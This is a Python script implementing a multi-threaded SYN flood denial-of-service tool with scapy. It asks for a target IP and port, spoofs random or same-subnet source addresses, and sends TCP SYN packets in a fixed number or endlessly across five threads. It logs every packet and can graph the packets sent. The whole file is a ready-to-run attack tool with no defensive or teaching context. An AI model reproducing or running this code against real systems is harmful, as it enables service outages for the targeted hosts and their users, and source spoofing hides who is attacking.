import ipaddress
import random
import socket
import struct
import time
from scapy.all import *
import netifaces
import logging
from threading import Thread, Lock
import matplotlib.pyplot as plt

# Setup logging
logging.basicConfig(filename='attack_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

# Global variables
pkt = []
lock = Lock()

def get_subnet(ip):  # Get the subnet mask of the local interface containing the specified IP
    for iface in netifaces.interfaces():
        iface_info = netifaces.ifaddresses(iface)
        if 2 in iface_info.keys():  # Check for IPv4 info
            if ip in iface_info[2][0].values():
                return iface_info[2][0]['netmask']
    return ""

def get_ip():  # Get the local IP address of the attacker
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("192.168.1.1", 80))  # Connect to any reachable IP to fetch local IP
    ip = s.getsockname()[0]
    s.close()
    return ip

def get_net():  # Calculate the network for the local IP and subnet
    ip = get_ip()
    subnet = get_subnet(ip)
    return ipaddress.IPv4Network(ip + "/" + subnet, strict=False)

def rand_ip(network):  # Generate a random IP within a network
    network = ipaddress.IPv4Network(network)
    network_int, = struct.unpack("!I", network.network_address.packed)
    rand_bits = network.max_prefixlen - network.prefixlen
    rand_host_int = random.randint(0, 2 ** rand_bits - 1)
    return ipaddress.IPv4Address(network_int + rand_host_int).exploded

def syn_dos(dest_ip, dest_port, cnt, single_ip, same_subnet):  # Execute SYN flood attack
    global pkt
    total = 0
    net = get_net()

    src_ip = rand_ip(net) if single_ip and same_subnet else rand_ip('0.0.0.0/0') if single_ip else None
    print(f"Attacking from {src_ip}" if src_ip else "Attacking from multiple IPs")

    while total < cnt or cnt == -1:
        sport, seq, win = random.randint(1000, 9000), random.randint(1000, 9000), random.randint(1000, 9000)
        ip_pkt = IP(src=src_ip) if single_ip else IP(src=rand_ip(net) if same_subnet else rand_ip('0.0.0.0/0'))
        ip_pkt.dst = dest_ip
        tcp_pkt = TCP(sport=sport, seq=seq, window=win, dport=dest_port, flags="S")
        pkt_to_send = ip_pkt / tcp_pkt
        send(pkt_to_send, verbose=0)

        with lock:
            pkt.append(total)
            total += 1
            logging.info(f"Packet Sent: Src IP={ip_pkt.src}, Dst IP={ip_pkt.dst}, Src Port={tcp_pkt.sport}, Dst Port={tcp_pkt.dport}")
            print(f"{total} Packets Sent", end="\r")
        time.sleep(0.01)

def update_graph():  # Visualize attack metrics
    plt.plot(range(len(pkt)), pkt)
    plt.xlabel("Time (s)")
    plt.ylabel("Packets Sent")
    plt.title("Attack Metrics")
    plt.show()

def main():  # Main function to initiate the SYN flood attack
    os.system("cls" if os.name == "nt" else "clear")
    dest_ip = input("Enter the Target IP Address: ").strip()
    print(f"Destination IP is {dest_ip}")

    dest_port = int(input("Enter the Target Port: "))

    cnt = input("How many packets to send (INF/inf for continuous): ")
    cnt = -1 if cnt.lower() == "inf" else int(cnt)

    single_ip = input("Use a single IP for attack (Y/N)? ").strip().lower() == "y"
    same_subnet = input("Spoofed IP on same subnet (Y/N)? ").strip().lower() == "y"

    threads = []
    for _ in range(5):  # Create 5 threads for multi-threading
        thread = Thread(target=syn_dos, args=(dest_ip, dest_port, cnt, single_ip, same_subnet))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    if input("Visualize attack metrics? (Y/N): ").strip().lower() == "y":
        update_graph()

if __name__ == "__main__":
    main()

